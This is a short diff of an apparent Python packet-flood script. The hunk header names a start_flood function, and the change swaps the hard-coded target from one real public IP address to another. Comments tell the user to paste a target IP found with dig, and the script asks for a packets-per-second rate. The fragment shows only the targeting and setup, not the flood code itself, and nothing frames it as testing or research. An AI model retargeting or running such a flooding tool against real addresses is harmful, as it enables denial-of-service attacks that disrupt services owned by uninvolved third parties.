@@ -50,7 +50,7 @@ def start_flood(target_ip, packets_per_second=100):
 if __name__ == "__main__":
     # PASTE THE IP ADDRESS HERE FROM THE DIG COMMAND
     # If you don't have it yet, use this placeholder:
-    target_ip = "103.220.73.113" 
+    target_ip = "172.67.158.228" 
     
     print(f"Target IP: {target_ip}")
     packets = int(input("Enter packets per second: ") or 100)
